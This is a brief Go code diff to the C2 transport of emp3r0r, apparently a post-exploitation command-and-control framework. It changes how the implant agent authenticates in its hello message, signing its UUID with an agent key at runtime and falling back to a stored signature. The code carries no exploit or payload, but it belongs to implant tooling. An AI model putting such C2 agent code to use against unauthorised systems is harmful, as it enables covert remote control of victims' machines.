@@ -2,6 +2,7 @@ package c2transport
 
 import (
 	"context"
+	"encoding/base64"
 	"fmt"
 	"io"
 	"net"
@@ -18,6 +19,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
 
 	"github.com/google/uuid"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
@@ -191,7 +193,15 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 			hello_msg.CmdID = uuid.NewString()
 			hello_msg.Tag = config.AgentTag
 			hello_msg.AgentUUID = config.AgentUUID
-			hello_msg.AgentUUIDSig = config.AgentUUIDSig
+
+			// Dynamic TOFU: Sign UUID with Agent Key for session authentication
+			sig, err := agentutils.SignWithAgentKey([]byte(config.AgentUUID))
+			if err != nil {
+				logging.Errorf("SignWithAgentKey: %v", err)
+				hello_msg.AgentUUIDSig = config.AgentUUIDSig // Fallback (will likely fail auth)
+			} else {
+				hello_msg.AgentUUIDSig = base64.URLEncoding.EncodeToString(sig)
+			}
 			if encodeErr := out.Encode(hello_msg); encodeErr != nil {
 				logging.Errorf("agent cannot connect to cc: %v", encodeErr)
 				util.TakeABlink()
